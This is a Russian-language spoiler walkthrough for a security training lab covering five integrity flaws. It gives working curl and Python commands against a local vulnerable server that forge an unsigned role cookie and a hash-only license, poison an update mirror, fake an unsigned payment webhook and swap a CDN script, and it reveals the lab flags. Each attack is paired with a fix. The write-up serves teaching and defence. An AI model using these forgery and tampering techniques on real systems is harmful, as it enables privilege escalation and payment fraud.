🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)

# A08 — Разбор решения (спойлеры)

Примеры: `curl` на `http://127.0.0.1:8071` (vulnerable) и короткие однострочники на Python для кодирования данных. В Windows удобнее Git Bash или WSL.

## Дефект 1 — состояние пользователя в cookie без подписи

После входа сервер выдаёт cookie `a08v_profile` — это просто `base64url({"user":"alice","role":"user"})`. Сервер при каждом запросе читает роль из неё.

```bash
FORGED=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'alice','role':'admin'}).encode()).decode().rstrip('='))")
curl -s -b "a08v_profile=$FORGED" http://127.0.0.1:8071/admin
# {"flag": "FLAG{a08_unsigned_profile_cookie}", "ok": true}
```

**Правило:** всё, что хранится у клиента, клиент может изменить. Доверенное состояние держим на сервере или подписываем.

**Fix:** cookie подписана HMAC-SHA256 с секретом сервера, а роль вообще не берётся из токена — она читается из серверного хранилища (`# FIX 1`).

> Про десериализацию: в реальных приложениях то же самое случается с `pickle`, Java-сериализацией, `unserialize()` в PHP и т.п. — там подмена данных может привести к выполнению кода. В лабу такие эксплойты намеренно не включены: для урока достаточно подмены данных. Правило то же — не десериализовать недоверенные данные и использовать простые форматы (JSON) вместе с подписью.

## Дефект 2 — «подпись» без секретного ключа

Cookie `a08v_license` = `base64url(json).sha256hex(json)`. Звучит как подпись, но SHA-256 — это просто хеш: посчитать его может кто угодно.

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
PROFILE=$(grep a08v_profile j.txt | awk '{print $7}')
FORGED=$(python3 - <<'PY'
import base64, hashlib, json
data = json.dumps({"user":"alice","plan":"pro"}, separators=(",",":")).encode()
print(base64.urlsafe_b64encode(data).decode().rstrip("=") + "." + hashlib.sha256(data).hexdigest())
PY
)
curl -s -b "a08v_profile=$PROFILE; a08v_license=$FORGED" http://127.0.0.1:8071/pro
# {"flag": "FLAG{a08_unkeyed_hash_is_not_a_signature}", "ok": true}
```

**Правило:** хеш защищает от случайной порчи, но не от злоумышленника. Против него нужен MAC с секретом (HMAC) или цифровая подпись.

**Fix:** `hmac.new(SECRET, data, sha256)` + `hmac.compare_digest`; лицензия привязана к пользователю (`# FIX 2`).

## Дефект 3 — обновление без проверки целостности

Зеркало «взломано» — атакующий опубликовал в пакете `theme-pack` лишнее поле `payout_account`:

```bash
curl -s -X POST http://127.0.0.1:8071/mirror/publish -H 'Content-Type: application/json' \
  -d '{"package":"theme-pack","version":"1.2","content":{"theme":"dark","payout_account":"ATTACKER-IBAN-6666"}}'
curl -s -X POST http://127.0.0.1:8071/system/run-update
curl -s http://127.0.0.1:8071/settings
# payout_account изменён; в ответе флаг FLAG{a08_update_without_integrity_check}
```

Ровно так работают атаки на цепочку поставок: доверие к источнику («это же наше зеркало») вместо проверки содержимого.

**Fix** (`# FIX 3`): «lock-файл» с закреплённым хешем каждого пакета, сравнение через `compare_digest`, отказ для пакета не из lock-файла, плюс белый список полей, которые пакет вообще может менять. Тот же принцип в реальном мире: `package-lock.json` с `integrity`, `pip install --require-hashes`, подпись артефактов (Sigstore/cosign), закреплённые дайджесты образов Docker.

## Дефект 4 — webhook без подписи

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
curl -s -X POST http://127.0.0.1:8071/webhook/payment -H 'Content-Type: application/json' \
  -d '{"order_id":1001,"status":"paid","amount":5000}'
curl -s -b j.txt http://127.0.0.1:8071/orders/1001
# status: paid, download_key: FLAG{a08_unsigned_webhook}
```

**Fix** (`# FIX 4`): провайдер подписывает `timestamp.тело` общим секретом (`X-Signature: sha256=...`, `X-Timestamp`). Сервер проверяет подпись, свежесть метки (±5 минут), что эта подпись ещё не использовалась (replay), и что сумма и состояние заказа совпадают.

Как выглядит корректная отправка в fixed (так делает настоящий провайдер, знающий секрет):

```python
import hashlib, hmac, json, time, requests
secret = b"lab-demo-webhook-secret"
body = json.dumps({"order_id": 1001, "status": "paid", "amount": 5000}).encode()
ts = str(int(time.time()))
sig = "sha256=" + hmac.new(secret, ts.encode() + b"." + body, hashlib.sha256).hexdigest()
r = requests.post("http://127.0.0.1:8072/webhook/payment", data=body,
                  headers={"X-Timestamp": ts, "X-Signature": sig, "Content-Type": "application/json"})
print(r.status_code, r.text)   # 200; повтор того же запроса -> 409; изменённое тело -> 401
```

Атакующий секрета не знает, поэтому без него сделать валидную подпись не может.

## Дефект 5 — сторонний скрипт без SRI

1. Откройте `http://127.0.0.1:8071/donate`: видите легитимные реквизиты `LAB-IBAN-0001-LEGIT`.
2. Выполните `curl -X POST http://127.0.0.1:8071/cdn/compromise` и обновите страницу: теперь там `ATTACKER-IBAN-6666`. Страница не менялась, но подгружаемый скрипт — да.

**Fix** (`# FIX 5`, страница `http://127.0.0.1:8072/donate`):

```html
<script src="/cdn/widget.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

Браузер сравнивает хеш полученного файла с `integrity` и просто не выполняет скрипт, если они не совпали. Повторите шаги на 8072: после `POST /cdn/compromise` реквизиты остаются «загрузка…», а в консоли браузера появляется ошибка проверки целостности. SRI защищает от подмены файла на CDN, но не от вредоносной версии, которую вы сами закрепили, — поэтому хеши берут из проверенной сборки.

## Итог
Общее у всех пяти дефектов: сервер или браузер **верит данным по их происхождению** («это же наша cookie / наше зеркало / наш платёжный провайдер / наш CDN»), а не **проверяет их подлинность**. Исправление везде одинаковое по смыслу: подпись или закреплённый хеш, секрет, которого нет у атакующего, проверка свежести и ограничение того, что даже доверенные данные могут изменить.
